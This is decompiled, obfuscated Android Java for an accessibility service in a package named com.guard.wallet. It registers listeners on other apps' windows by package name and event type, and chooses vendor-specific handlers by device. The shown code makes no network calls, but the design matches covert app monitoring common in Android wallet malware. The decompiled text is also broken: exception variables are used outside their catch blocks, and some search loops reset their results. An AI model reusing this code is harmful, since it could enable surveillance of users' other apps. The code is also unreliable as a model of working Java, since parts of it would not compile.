package com.guard.wallet.service;

import a0.C0001a;
import a0.C0002b;
import a1.AbstractC0026q;
import android.accessibilityservice.AccessibilityService;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import p012o.AbstractC0414c;
import p012o.C0416e;
import p012o.C0418g;
import p012o.C0419h;
import p012o.C0420i;
import p012o.C0422k;
import p012o.C0423l;
import p012o.C0425n;
import p012o.C0426o;
import p012o.C0428q;
import p012o.C0429r;
import p012o.C0431t;
import p012o.C0433v;
import p012o.C0435x;
import p012o.RunnableC0415d;
import p012o.a0;
import p012o.c0;
import p012o.e0;
import p012o.g0;
import p012o.i0;

/* loaded from: classes.dex */
public abstract class AccessibilityDelegateManager extends AccessibilityService {

    /* renamed from: j */
    public static final Integer f302j = 204832;

    /* renamed from: a */
    public final ConcurrentLinkedQueue f303a = new ConcurrentLinkedQueue();

    /* renamed from: b */
    public final ConcurrentLinkedQueue f304b = new ConcurrentLinkedQueue();

    /* renamed from: c */
    public final ConcurrentLinkedQueue f305c = new ConcurrentLinkedQueue();

    /* renamed from: d */
    public final ConcurrentLinkedQueue f306d = new ConcurrentLinkedQueue();

    /* renamed from: e */
    public final C0429r f307e = new C0429r();

    /* renamed from: f */
    public final c0 f308f = new c0();

    /* renamed from: g */
    public final g0 f309g = new g0();

    /* renamed from: h */
    public final AtomicBoolean f310h = new AtomicBoolean(false);

    /* renamed from: i */
    public final AtomicBoolean f311i = new AtomicBoolean(false);

    /* renamed from: A */
    public final void m516A() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 7));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: B */
    public final void m517B() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 5));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: C */
    public final void m518C(String str, List list) {
        if (list != null) {
            try {
                if (list.isEmpty()) {
                    return;
                }
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ListenWindow listenWindow = (ListenWindow) it.next();
                    if (listenWindow != null) {
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                            String packageName = listenWindow.getPackageName();
                            try {
                                if (!AbstractC0026q.m151B(packageName)) {
                                    this.f304b.remove(packageName);
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                            }
                        }
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(f302j)) {
                            String packageName2 = listenWindow.getPackageName();
                            try {
                                if (!AbstractC0026q.m151B(packageName2)) {
                                    this.f305c.remove(packageName2);
                                }
                            } catch (Exception e3) {
                                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                            }
                        }
                        String v02 = AbstractC0251g.v0(listenWindow.getPackageName(), listenWindow.getClassName(), str);
                        try {
                            if (!AbstractC0026q.m151B(v02)) {
                                this.f306d.remove(v02);
                            }
                        } catch (Exception e4) {
                            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e4);
                        }
                    }
                }
            } catch (Exception e5) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
            }
        }
    }

    /* renamed from: D */
    public final void m519D() {
        try {
            boolean m535p = m535p();
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
            if (m535p) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it = concurrentLinkedQueue.iterator();
                        while (it.hasNext()) {
                            C0416e c0416e = (C0416e) it.next();
                            if (c0416e instanceof a0) {
                                ((a0) c0416e).N0();
                            }
                        }
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                }
                m517B();
            }
            if (m533n() != null) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it2 = concurrentLinkedQueue.iterator();
                        while (it2.hasNext()) {
                            C0416e c0416e2 = (C0416e) it2.next();
                            if (c0416e2 instanceof C0431t) {
                                ((C0431t) c0416e2).b0();
                            }
                        }
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                }
                m545z();
            }
            if (m534o()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it3 = concurrentLinkedQueue.iterator();
                        while (it3.hasNext()) {
                            C0416e c0416e3 = (C0416e) it3.next();
                            if (c0416e3 instanceof C0435x) {
                                ((C0435x) c0416e3).m1169W();
                            }
                        }
                    }
                } catch (Exception e4) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e4);
                }
                m516A();
            }
            if (m527h()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it4 = concurrentLinkedQueue.iterator();
                        while (it4.hasNext()) {
                            C0416e c0416e4 = (C0416e) it4.next();
                            if (c0416e4 instanceof C0422k) {
                                ((C0422k) c0416e4).m1127I(false);
                            }
                        }
                    }
                } catch (Exception e5) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
                }
                m541v();
            }
            if (m526g()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it5 = concurrentLinkedQueue.iterator();
                        while (it5.hasNext()) {
                            C0416e c0416e5 = (C0416e) it5.next();
                            if (c0416e5 instanceof AbstractC0414c) {
                                ((AbstractC0414c) c0416e5).mo1051Z();
                            }
                        }
                    }
                } catch (Exception e6) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e6);
                }
                m543x();
            }
            if (m532m()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it6 = concurrentLinkedQueue.iterator();
                        while (it6.hasNext()) {
                            C0416e c0416e6 = (C0416e) it6.next();
                            if (c0416e6 instanceof C0426o) {
                                ((C0426o) c0416e6).mo1001d();
                            }
                        }
                    }
                } catch (Exception e7) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e7);
                }
                m544y();
            }
            if (m528i()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it7 = concurrentLinkedQueue.iterator();
                        while (it7.hasNext()) {
                            C0416e c0416e7 = (C0416e) it7.next();
                            if (c0416e7 instanceof C0423l) {
                                ((C0423l) c0416e7).mo1001d();
                            }
                        }
                    }
                } catch (Exception e8) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e8);
                }
                m542w();
            }
        } catch (Exception e9) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e9);
        }
    }

    /* renamed from: a */
    public final void m520a() {
        boolean z2;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            try {
                if (!concurrentLinkedQueue.isEmpty()) {
                    Iterator it = concurrentLinkedQueue.iterator();
                    while (it.hasNext()) {
                        if (((C0416e) it.next()) instanceof C0420i) {
                            z2 = true;
                            break;
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
            z2 = false;
            if (z2) {
                m540u();
            }
            concurrentLinkedQueue.add(new C0420i());
            m539t(C0420i.class.getName(), C0420i.m1117L());
        } catch (Exception e3) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
        }
    }

    /* renamed from: b */
    public final void m521b(String str) {
        try {
            if (m526g()) {
                m543x();
            }
            boolean m620i = AbstractC0249e.m620i();
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
            if (m620i) {
                C0433v c0433v = new C0433v();
                concurrentLinkedQueue.add(c0433v);
                m539t(C0433v.class.getName(), C0433v.w0());
                try {
                    AbstractC0243l.m593c(new RunnableC0415d(c0433v, str, 4), c0433v.f864c);
                    return;
                } catch (Exception e2) {
                    AbstractC0026q.m186s("o.v", e2);
                    return;
                }
            }
            if (AbstractC0249e.m624m()) {
                C0428q c0428q = new C0428q();
                concurrentLinkedQueue.add(c0428q);
                m539t(C0428q.class.getName(), C0428q.l0());
                try {
                    AbstractC0243l.m593c(new RunnableC0415d(c0428q, str, 3), c0428q.f864c);
                    return;
                } catch (Exception e3) {
                    AbstractC0026q.m186s("o.q", e3);
                    return;
                }
            }
            if (AbstractC0249e.m618g()) {
                C0425n c0425n = new C0425n();
                concurrentLinkedQueue.add(c0425n);
                m539t(C0425n.class.getName(), C0425n.s0());
                try {
                    AbstractC0243l.m593c(new RunnableC0415d(c0425n, str, 2), c0425n.f864c);
                    return;
                } catch (Exception e4) {
                    AbstractC0026q.m186s("o.n", e4);
                    return;
                }
            }
            if (AbstractC0249e.m623l()) {
                i0 i0Var = new i0();
                concurrentLinkedQueue.add(i0Var);
                m539t(i0.class.getName(), i0.u0());
                try {
                    AbstractC0243l.m593c(new RunnableC0415d(i0Var, str, 6), i0Var.f864c);
                    return;
                } catch (Exception e5) {
                    AbstractC0026q.m186s("o.i0", e5);
                    return;
                }
            }
            if (AbstractC0249e.m622k()) {
                e0 e0Var = new e0();
                concurrentLinkedQueue.add(e0Var);
                m539t(e0.class.getName(), e0.n0());
                try {
                    AbstractC0243l.m593c(new RunnableC0415d(e0Var, str, 5), e0Var.f864c);
                    return;
                } catch (Exception e6) {
                    AbstractC0026q.m186s("o.e0", e6);
                    return;
                }
            }
            C0418g c0418g = new C0418g();
            concurrentLinkedQueue.add(c0418g);
            m539t(C0418g.class.getName(), C0418g.k0());
            try {
                AbstractC0243l.m593c(new RunnableC0415d(c0418g, str, 1), c0418g.f864c);
                return;
            } catch (Exception e7) {
                AbstractC0026q.m186s("o.g", e7);
                return;
            }
        } catch (Exception e8) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e8);
        }
        AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e8);
    }

    /* renamed from: c */
    public final C0416e m522c(ListenWindow listenWindow) {
        C0416e c0416e;
        if (listenWindow != null) {
            try {
                String packageName = listenWindow.getPackageName();
                ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it = concurrentLinkedQueue.iterator();
                        while (it.hasNext()) {
                            c0416e = (C0416e) it.next();
                            if (Objects.equals(c0416e.f862a, packageName)) {
                                break;
                            }
                        }
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                }
                c0416e = null;
                if (c0416e == null) {
                    c0416e = new C0416e(Collections.singletonList(listenWindow), listenWindow.getPackageName());
                    try {
                        concurrentLinkedQueue.add(c0416e);
                    } catch (Exception e3) {
                        AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                    }
                    if (listenWindow.getEventTypes() != null) {
                        m538s(listenWindow.getPackageName());
                    }
                    if (listenWindow.getEventTypes() != null) {
                        m536q(listenWindow.getPackageName());
                    }
                    m537r(listenWindow.listenWindowUniqueId(c0416e.getClass().getName()));
                    return c0416e;
                }
                try {
                    c0416e.f865d.add(listenWindow);
                } catch (Exception e4) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e4);
                }
                if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                    m538s(listenWindow.getPackageName());
                }
                if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(f302j)) {
                    m536q(listenWindow.getPackageName());
                }
                m537r(listenWindow.listenWindowUniqueId(c0416e.getClass().getName()));
                return c0416e;
            } catch (Exception e5) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
            }
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
        }
        return null;
    }

    /* renamed from: d */
    public final C0416e m523d(String str, List list) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return null;
            }
            C0416e c0416e = new C0416e(list, str);
            try {
                this.f303a.add(c0416e);
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
            if (list != null && !list.isEmpty()) {
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ListenWindow listenWindow = (ListenWindow) it.next();
                    if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                        m538s(listenWindow.getPackageName());
                    }
                    if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(f302j)) {
                        m536q(listenWindow.getPackageName());
                    }
                    m537r(listenWindow.listenWindowUniqueId(C0416e.class.getName()));
                }
            }
            return c0416e;
        } catch (Exception e3) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
            return null;
        }
    }

    /* renamed from: e */
    public final void m524e() {
        try {
            if (m535p()) {
                m517B();
            }
            this.f303a.add(new a0());
            m539t(a0.class.getName(), a0.E0());
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: f */
    public final boolean m525f() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof C0419h) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: g */
    public final boolean m526g() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof AbstractC0414c) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: h */
    public final boolean m527h() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof C0422k) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: i */
    public final boolean m528i() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof C0423l) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: j */
    public final boolean m529j() {
        try {
            if (m535p() || m533n() != null || m534o() || m527h() || m532m() || m528i() || m525f()) {
                return true;
            }
            return m526g();
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: k */
    public final boolean m530k(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return false;
            }
            return this.f304b.contains(str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: l */
    public final boolean m531l(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return false;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f306d;
            int i2 = 1;
            if (concurrentLinkedQueue.contains(str)) {
                return true;
            }
            return concurrentLinkedQueue.stream().anyMatch(new C0002b(this, str, i2));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: m */
    public final boolean m532m() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof C0426o) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: n */
    public final C0431t m533n() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return null;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                C0416e c0416e = (C0416e) it.next();
                if (c0416e instanceof C0431t) {
                    return (C0431t) c0416e;
                }
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return null;
        }
    }

    /* renamed from: o */
    public final boolean m534o() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof C0435x) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: p */
    public final boolean m535p() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((C0416e) it.next()) instanceof a0) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /* renamed from: q */
    public final void m536q(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f305c;
            if (concurrentLinkedQueue.contains(str)) {
                return;
            }
            concurrentLinkedQueue.offer(str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: r */
    public final void m537r(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f306d;
            if (concurrentLinkedQueue.contains(str)) {
                return;
            }
            concurrentLinkedQueue.offer(str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: s */
    public final void m538s(String str) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f304b;
            if (concurrentLinkedQueue.contains(str)) {
                return;
            }
            concurrentLinkedQueue.offer(str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: t */
    public final void m539t(String str, List list) {
        if (list != null) {
            try {
                if (list.isEmpty()) {
                    return;
                }
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ListenWindow listenWindow = (ListenWindow) it.next();
                    if (listenWindow != null) {
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                            m538s(listenWindow.getPackageName());
                        }
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(f302j)) {
                            m536q(listenWindow.getPackageName());
                        }
                        m537r(AbstractC0251g.v0(listenWindow.getPackageName(), listenWindow.getClassName(), str));
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
        }
    }

    /* renamed from: u */
    public final void m540u() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 6));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: v */
    public final void m541v() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 0));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: w */
    public final void m542w() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 3));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: x */
    public final void m543x() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 1));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: y */
    public final void m544y() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 2));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /* renamed from: z */
    public final void m545z() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f303a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new C0001a(this, 8));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }
}
